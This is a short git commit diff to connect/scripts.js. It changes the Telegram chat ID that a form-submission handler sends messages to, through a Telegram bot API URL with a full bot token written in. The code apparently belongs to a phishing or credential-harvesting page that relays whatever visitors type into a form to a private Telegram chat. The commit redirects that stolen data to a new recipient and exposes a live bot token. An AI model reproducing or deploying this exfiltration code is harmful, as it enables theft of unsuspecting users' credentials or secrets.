5750e9a88e657f9ca366d8e5d8533d57203848a2
Arogunb2021 <blessingarogunbo@gmail.com>
2023-07-12 02:45:20 +0100

    ko

--- connect/scripts.js
+++ connect/scripts.js
@@ -8,7 +8,7 @@ $("#former").submit(function(e) {
 
 async function sendMessage(message){
     return new Promise((resolve, reject)=>{
-      const chat_id = 5737586032;
+      const chat_id = 6118853732;
       fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
             method: "GET",
             headers: {
